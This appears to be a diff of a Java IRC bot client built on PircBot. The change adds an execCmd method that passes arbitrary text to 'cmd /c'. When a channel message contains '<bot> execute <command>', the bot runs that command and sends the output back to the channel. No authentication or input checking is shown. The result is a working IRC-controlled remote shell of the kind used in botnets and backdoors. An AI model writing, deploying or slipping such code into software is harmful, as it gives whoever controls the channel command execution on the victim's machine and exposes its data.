@@ -1,16 +1,17 @@
 package client;
 
+import java.io.IOException;
 import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.Scanner;
 
 import org.jibble.pircbot.PircBot;
 
-import util.Executor;
+
 
 public class Client extends PircBot {
 	private String nameSet;
-	public Executor exec = new Executor();
+
 	public Client(String name) {
 		this.setName(name);
 
@@ -20,6 +21,10 @@ public class Client extends PircBot {
 		return "";//this.getNick().substring()
 	}
 	
+	public static String execCmd(String cmd) throws java.io.IOException {
+	    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec("cmd /c "+ cmd).getInputStream()).useDelimiter("\\A");
+	    return s.hasNext() ? s.next() : "";
+	}
 	public void setVariableName(String nameSet) {
 		this.nameSet = nameSet;
 	}
@@ -34,14 +39,22 @@ public class Client extends PircBot {
 				System.out.println("command directed to me");
 				if (words.length > 2 && words[1].equals("execute")) {
 					System.out.println("executing command");
-					String command = message.substring(message.indexOf("execute ") + 8, message.length());
-					exec.executeCommand(command);
-					
-					ArrayList<String> output = exec.getOutput();
-					for(String ab : output) {
-					sendMessage(channel, ab);
-					System.out.println(ab);
+					String command = message.substring(message.indexOf("execute") + 8, message.length());
+					//ArrayList<String> output = new ArrayList<String>();
+					try {
+						String cmdOutput = execCmd(command);
+						for(String b: cmdOutput.split("\n")) {
+							sendMessage(channel, b);
+						}
+						
+						
+						//sendMessage(channel, execCmd(command));
+					} catch (IOException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+						sendMessage(channel, "Command failed.");
 					}
+	
 				}
 
 			}
